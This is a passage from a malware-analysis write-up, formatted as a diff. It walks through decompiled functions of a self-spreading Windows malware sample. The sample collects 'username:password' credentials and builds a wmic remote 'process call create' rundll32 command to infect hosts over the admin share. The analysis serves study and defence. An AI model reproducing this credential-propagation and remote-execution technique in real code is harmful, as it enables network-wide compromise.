+Next we see `FUN_10006bb0` being invoked to obtain some string.
+
+### FUN_10006bb0
+
+```cpp
+uint FUN_10006bb0(LPWSTR param_1){
+  uint uVar1;
+  WCHAR WVar2;
+  short *psVar3;
+  uint uVar4;
+  WCHAR *pWVar5;
+  short *psVar6;
+  WCHAR local_804;
+  undefined local_802 [2046];
+  
+  uVar4 = minutes_left_before_cmd_arg1_reached();
+  if (uVar4 < 10) {
+    uVar4 = 10;
+  }
+  wsprintfW(&local_804,L"%d",uVar4);
+  pWVar5 = &local_804;
+  do {
+    WVar2 = *pWVar5;
+    pWVar5 = pWVar5 + 1;
+  } while (WVar2 != L'\0');
+  uVar4 = (int)((int)pWVar5 - (int)local_802) >> 1;
+  EnterCriticalSection((LPCRITICAL_SECTION)&critical_section_no_config);
+  if (_DAT_10016010 != 0) {
+    FUN_10006af0();
+  }
+  psVar3 = &DAT_1001b110;
+  do {
+    psVar6 = psVar3;
+    psVar3 = psVar6 + 1;
+  } while (*psVar6 != 0);
+  uVar1 = ((int)(psVar6 + -0x800d888) >> 1) + uVar4;
+  if (uVar1 < 0x1ffe) {
+    *param_1 = L'\0';
+    StrCatW(param_1,&local_804);
+    StrCatW(param_1,&DAT_1001b110);
+    uVar4 = uVar1;
+  }
+  else {
+    SetLastError(0x7a);
+  }
+  LeaveCriticalSection((LPCRITICAL_SECTION)&critical_section_no_config);
+  return uVar4;
+}
+```
+
+First we see the number of minutes left before the first cmd argument is reached being checked, if this is less than 10 then it is set to 10 anyway this value if then added to a format string `%minutes`.
+
+After this we see a critical section being entered and a call made to `FUN_10006af0`.
+
+### FUN_10006af0
+
+```cpp
+void FUN_10006af0(void){
+  WCHAR WVar1;
+  undefined4 *lpMem;
+  WCHAR *pWVar2;
+  int iVar3;
+  HANDLE hHeap;
+  uint uVar4;
+  DWORD dwFlags;
+  WCHAR local_808;
+  undefined local_806 [2046];
+  int *local_8;
+  
+  DAT_1001b110 = 0;
+  uVar4 = 0;
+  local_8 = (int *)0x0;
+  lpMem = wait_for_something_read_crit(1,(int *)&local_8,critical_section_with_extra_debug);
+  if (lpMem != (undefined4 *)0x0) {
+    do {
+      wsprintfW(&local_808,L" \"%ws:%ws\"",*(undefined4 *)*local_8,((undefined4 *)*local_8)[1]);
+      pWVar2 = &local_808;
+      do {
+        WVar1 = *pWVar2;
+        pWVar2 = pWVar2 + 1;
+      } while (WVar1 != L'\0');
+      uVar4 = ((int)((int)pWVar2 - (int)local_806) >> 1) + uVar4;
+      if (0x1ff4 < uVar4) break;
+      StrCatW(&DAT_1001b110,&local_808);
+      local_8 = (int *)0x0;
+      iVar3 = wait_for_null((int *)&local_8,lpMem,critical_section_with_extra_debug);
+    } while (iVar3 != 0);
+    dwFlags = 0;
+    hHeap = GetProcessHeap();
+    HeapFree(hHeap,dwFlags,lpMem);
+  }
+  _DAT_10016010 = 0;
+  _DAT_1001f0f8 = 0;
+  return;
+}
+```
+
+The main result of this function appears to be stored in `DAT_1001b110` instead of via registers or the stack.
+
+First we see something being read from the critical section. Next we see a string of the from ` %ws:%ws` being constructed with the data that was read. Given what we know from other parts of the program this has to be a ` username:password` string. Multiple credential strings like this are retrieved and all are added to `local_808` which is constantly appended to `DAT_100b110`. This also concludes the function, we will rename `DAT_1001b110` to `username_password_args` and `FUN_10006af0` to `retrieve_username_password_credentials`.
+
+### Back to FUN_10006bb0
+
+Back after the call we see the global the credentials were stored in again. We then see the format string we had up to this point being placed into `param_1` and then concatenated with the user credentials. This argument string is then returned by the function. We will rename the function to `fetch_cmd_arguments`.
+
+### Back to FUN_100097a5
+
+Back here we see that the just fetched commandline arguments are placed into the same buffer using [memcpy](http://www.cplusplus.com/reference/cstring/memcpy/). This means that `param_3` now stores a complete string to launch the malware using all the credentials gathered so far. We will rename the function to `construct_malware_lauch_command`.
+
+### Back to FUN_10009987
+
+Back here we first rename the parameters passed to the construct lauch command function, these being `dllhost` and `launch_cmd`.
+
+Next we seen an alternative to the function we just executed, whether this is executed or not depends on the value of `iStack72388` which is `0` when the token was duplicated as was the case with our path. But if it is `1` however it deletes the remove malware file if the password and username are `NULL`. If the password and username are not `NULL` however then `FUN_100098ab` is invoked with `dllhost`, `host`, `username` and `password`. This might attempt to authenticate either way.
+
+### FUN_10009ab
+
+```cpp
+undefined4 __thiscall
+FUN_100098ab(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3){
+  WCHAR WVar1;
+  UINT UVar2;
+  BOOL BVar3;
+  int iVar4;
+  int iVar5;
+  WCHAR *pWVar6;
+  LPWSTR unaff_ESI;
+  WCHAR local_420c [8192];
+  undefined local_20c [516];
+  undefined4 uStack8;
+  
+  uStack8 = 0x100098b8;
+  *unaff_ESI = L'\0';
+  *(undefined2 *)this = 0;
+  get_dll_filename((int)local_20c);
+  UVar2 = GetSystemDirectoryW((LPWSTR)this,0x104);
+  if (UVar2 == 0) {
+    GetLastError();
+  }
+  else {
+    PathAppendW((LPWSTR)this,L"wbem\\wmic.exe");
+    BVar3 = PathFileExistsW((LPCWSTR)this);
+    if (BVar3 != 0) {
+      iVar4 = wsprintfW(unaff_ESI,L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" ",this,param_1,
+                        param_2,param_3);
+      iVar5 = wsprintfW(unaff_ESI + iVar4,
+                                                
+                        L"process call create \"C:\\Windows\\System32\\rundll32.exe\\\"C:\\Windows\\%s\\\" #1 "
+                        ,local_20c);
+      iVar4 = iVar4 + iVar5;
+      fetch_cmd_arguments(local_420c);
+      pWVar6 = local_420c;
+      while( true ) {
+        WVar1 = *pWVar6;
+        if (WVar1 == L'\"') {
+          unaff_ESI[iVar4] = L'\\';
+          iVar4 = iVar4 + 1;
+        }
+        unaff_ESI[iVar4] = WVar1;
+        if (WVar1 == L'\0') break;
+        pWVar6 = pWVar6 + 1;
+        iVar4 = iVar4 + 1;
+      }
+      wsprintfW(unaff_ESI + iVar4,L"\"");
+      return 1;
+    }
+  }
+  *unaff_ESI = L'\0';
+  *(undefined2 *)this = 0;
+  return 0;
+}
+```
+
+Interestingly it seems like there was another argument passed via `ESI`. Setting up custom storage reveals that this is the `launch_cmd`. It should be noted that both `dllhost` and `lauch_cmd` are empty in this branch, so this function probably populates them using an alternative method.
+
+```cpp
+undefined4 __thiscall FUN_100098ab(void *this,undefined4 param_2,undefined4 param_3,undefined4 param_4,LPWSTR param_5){
+  WCHAR WVar1;
+  UINT UVar2;
+  BOOL BVar3;
+  int iVar4;
+  int iVar5;
+  WCHAR *pWVar6;
+  WCHAR local_420c [8192];
+  undefined dll_name [516];
+  undefined4 uStack8;
+  
+  uStack8 = 0x100098b8;
+  *param_5 = L'\0';
+  *(undefined2 *)this = 0;
+  get_dll_filename((int)dll_name);
+  UVar2 = GetSystemDirectoryW((LPWSTR)this,0x104);
+  if (UVar2 == 0) {
+    GetLastError();
+  }
+  else {
+    PathAppendW((LPWSTR)this,L"wbem\\wmic.exe");
+    BVar3 = PathFileExistsW((LPCWSTR)this);
+    if (BVar3 != 0) {
+      iVar4 = wsprintfW(param_5,L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" ",this,param_2,
+                        param_3,param_4);
+      iVar5 = wsprintfW(param_5 + iVar4,
+                                                
+                        L"process call create \"C:\\Windows\\System32\\rundll32.exe\\\"C:\\Windows\\%s\\\" #1 "
+                        ,dll_name);
+      iVar4 = iVar4 + iVar5;
+      fetch_cmd_arguments(local_420c);
+      pWVar6 = local_420c;
+      while( true ) {
+        WVar1 = *pWVar6;
+        if (WVar1 == L'\"') {
+          param_5[iVar4] = L'\\';
+          iVar4 = iVar4 + 1;
+        }
+        param_5[iVar4] = WVar1;
+        if (WVar1 == L'\0') break;
+        pWVar6 = pWVar6 + 1;
+        iVar4 = iVar4 + 1;
+      }
+      wsprintfW(param_5 + iVar4,L"\"");
+      return 1;
+    }
+  }
+  *param_5 = L'\0';
+  *(undefined2 *)this = 0;
+  return 0;
+}
+```
+
+This function starts off by getting the system directory and then appendinb `wbem\wmic.exe` resulting in `C:\Windows\wbem\wmic.exe`. Next some arguments are added to this string `C:\Windows\wbem\wmic.exe /node:"%host" /user:"%username" /password:"%password" `. After this the string is further exended resulting in `C:\Windows\wbem\wmic.exe /node:"%host" /user:"%username" /password:"%password" process call create "C:\Windows\System32\rundll32.exe \"C:\Windows\%dll\" #1 `. Next we see the command line arguments being fetched and appended again and then the function returns. This is a similar way of making a command to start the malware with all the credentials so far but instead it runs as a certain user (probably less privileged). We will rename the function to `construct_malware_launch_command_alternative`.
+
+### Back to FUN_10009987
+
+Assuming that somehow via either method a launch string was created for the malware we see a new process being started either directly using `dllhost` or as a user using [CreateProcessAsUserW](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw) with the created impersonation token.
+
+After this the subroutine waits for the process to complete and then performs some checks on the exit code of the child process (copy of the malware) before performing some cleanup and exiting. We will rename this function to `spread_via_admin_share`.
+
+### Back to FUN_10009f8e
+
+After spreading we see some functions being invoked on the `local_30` objects. Namely, `meth_10006f91`.
+
+### meth_10006f91
+
+```cpp
+void __thiscall meth_10006f91(cls_10006f91 *this,undefined param_1,undefined4 param_2,undefined4 param_3){
+  short sVar1;
+  short *psVar2;
+  short local_28 [16];
+  undefined4 local_8;
+  
+  local_8 = 1;
+  psVar2 = (short *)((int)local_28 - (int)this);
+  do {
+    sVar1 = *(short *)&this->mbr_0;
+    *(short *)((int)psVar2 + (int)this) = sVar1;
+    this = (cls_10006f91 *)((int)&this->mbr_0 + 2);
+  } while (sVar1 != 0);
+  pass_credentials(local_28,_param_1,param_2);
+  return;
+}
+```
+
+We see that this function accesses some members and passes more credentials. probably this is just some object to store credentials and this is just passing some of them on to the `pass_credentials` function we looked at earlier while also storing them in the object for later use probably on one of the next fuction.
+
+### Back to FUN_10009f8e
+
+Right after the method calls we see `FUN_10006f02` being invoked with the credentials object.
+
+### FUN_10006f02
+
+```cpp
+uint FUN_10006f02(short *cred_obj){
+  short sVar1;
+  int iVar2;
+  uint uVar3;
+  short *psVar4;
+  short *psVar5;
+  undefined4 unaff_EBX;
+  LPCRITICAL_SECTION unaff_ESI;
+  short **local_8;
+  
+  local_8 = (short **)0x0;
+  iVar2 = wait_for_null((int *)&local_8,unaff_EBX,unaff_ESI);
+  if (iVar2 == 0) {
+    uVar3 = 0;
+  }
+  else {
+    psVar4 = *local_8;
+    psVar5 = cred_obj;
+    do {
+      sVar1 = *psVar4;
+      *psVar5 = sVar1;
+      psVar4 = psVar4 + 1;
+      psVar5 = psVar5 + 1;
+    } while (sVar1 != 0);
+    uVar3 = (uint)(cred_obj != (short *)0x0);
+  }
+  return uVar3;
+}
+```
+
+We first add custom storage for the registers.
+
+```cpp
+uint FUN_10006f02(short *cred_obj,undefined4 param_2,LPCRITICAL_SECTION param_3){
+  short sVar1;
+  int iVar2;
+  uint uVar3;
+  short *psVar4;
+  short *psVar5;
+  short **local_8;
+  
+  local_8 = (short **)0x0;
+  iVar2 = wait_for_null((int *)&local_8,param_2,param_3);
+  if (iVar2 == 0) {
+    uVar3 = 0;
+  }
+  else {
+    psVar4 = *local_8;
+    psVar5 = cred_obj;
+    do {
+      sVar1 = *psVar4;
+      *psVar5 = sVar1;
+      psVar4 = psVar4 + 1;
+      psVar5 = psVar5 + 1;
+    } while (sVar1 != 0);
+    uVar3 = (uint)(cred_obj != (short *)0x0);
+  }
+  return uVar3;
+}
+```
+
+This function appears to just wait and then store something in the credentials object. We will rename the function to `get_cred_data`.
+
+### Back to FUN_10009f8e
+
+Assuming that the previous function managed to get its data we see `FUN_10006f78` being called otherwise the loop keeps on trying to spread via the admin share repeatedly untill it works, probably using different access tokens each time.
+
+### FUN_10006f78
+
+```cpp
+void FUN_10006f78(LPVOID param_1){
+  HANDLE hHeap;
+  DWORD dwFlags;
+  
+  dwFlags = 0;
+  hHeap = GetProcessHeap();
+  HeapFree(hHeap,dwFlags,param_1);
+  return;
+}
+```
+
+This function is surprisingly trivial, it free some memory and that's it. We will rename it to `free_memory.
+
+### Back to FUN_10009f8e
+
+This finished up the entire function for infecting other hosts via the admin share. Effectively this is a 2 step procedure. First the malware is copied over via using the admin share, secondly a remote command is created and executed to start the copy on the remote host. This copy is given all the credentials gathered up to that point which it can then immediately use to further spread. We will rename this function to `infect_hosts_via_admin_share`.
+
+### Back to Ordinal_1
+
+This finishes the first thread started inside the loop.
 
 
 
@@ -8537,7 +9769,7 @@ undefined8 FUN_140002554(int param_1,longlong param_2){
 - `FUN_10008d5a` - `destroy_boot` rip everyone
 - `FUN_10001038` - could be revisited as we now have more information
 - `possible_lock` - seems related to passing around new hosts to infect but no read function has been found yet. Also possible that the function itself does this but in that case it is strange for there to be no clear networking related logic.
-- `handle_color_arg` - these arguments were passed to the lock functions, we now know these often take in IP addresses, the main thing I can think of with a `:` in it that is then related is a an adress of the form `IP:PORT`.
+- `handle_color_arg` - Handles `username:password` input.
 
 ##### Late renames
 - `FUN_10001038` to `something_with_drive_path` (probably prepares the drive path)
